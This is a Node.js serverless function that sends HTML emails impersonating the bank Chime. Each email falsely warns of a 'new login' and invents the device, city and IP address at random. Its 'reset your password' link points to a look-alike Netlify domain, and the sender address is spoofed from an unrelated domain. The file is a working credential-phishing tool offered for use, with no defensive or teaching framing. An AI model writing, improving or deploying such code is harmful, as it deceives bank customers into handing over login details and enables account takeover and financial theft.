const fetch = require("node-fetch");

exports.handler = async (event, context) => {
  try {

    // Parse passed JSON
    const body = JSON.parse(event.body);

    // RANDOM DEVICE LIST
    const devices = [
      "Safari iOS",
      "Safari iPhone",
      "Chrome Windows 11",
      "Chrome Windows 10",
      "Firefox Windows",
      "Safari Mac",
      "Chrome Macbook",
      "Chrome Android",
      "Safari iPadOS"
    ];

    const locations = [
      "Los Angeles, CA, USA",
      "Houston, TX, USA",
      "Atlanta, GA, USA",
      "Phoenix, AZ, USA",
      "Miami, FL, USA",
      "Denver, CO, USA",
      "Chicago, IL, USA",
      "Dallas, TX, USA",
      "San Antonio, TX, USA"
    ];

    function rand() {
      return Math.floor(Math.random() * 255);
    }

    function randomIP() {
      return `${rand()}.${rand()}.${rand()}.${rand()}`;
    }

    // CURRENT US TIME
    const timeUS = new Date().toLocaleString("en-US", {
      timeZone: "America/Chicago",
      hour12: true
    });

    // RANDOM VALUES
    const randomDevice = devices[Math.floor(Math.random() * devices.length)];
    const randomLocation = locations[Math.floor(Math.random() * locations.length)];
    const randomIPAddress = randomIP();

    // BUILD EMAIL HTML
    const htmlBody = `
<!DOCTYPE html>
<html>
<body style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1c1c1e;background:#ffffff;padding:30px;">

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/49/Chime_logo_2023.svg/2560px-Chime_logo_2023.svg.png" width="100" style="margin-bottom:24px;" />

<h2 style="font-size:24px;margin-bottom:20px;">New login to Chime</h2>

<p>Hi ${body.first_name},</p>

<p>We noticed a new login to your Chime account.</p>

<ul>
<li><strong>Date & Time:</strong> ${timeUS}</li>
<li><strong>Device:</strong> ${randomDevice}</li>
<li><strong>Approximate Location:</strong> ${randomLocation}</li>
<li><strong>IP Address:</strong> ${randomIPAddress}</li>
</ul>

<p>If this wasn’t you, please <a href="https://chime-reset-your-password.netlify.app" style="color:#00b956;">reset your password</a> immediately and review your transactions.</p>

<p>Sincerely,<br>The Chime Team</p>

</body>
</html>
`;

    // SEND REQUEST TO ZEPTOMAIL
    const response = await fetch("https://api.zeptomail.com/v1.1/email", {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Zoho-enczapikey " + process.env.ZEPTO_MAIL_TOKEN
      },
      body: JSON.stringify({
        from: { address: "chime@moneybaggo.info", name:"Chime"},
        to: [{ email_address:{ address: body.to_email, name:"Recipient"} }],
        subject: "New login to Chime",
        htmlbody: htmlBody
      })
    });

    const data = await response.json();

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, data })
    };

  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success:false, error:err.message })
    }
  }
};
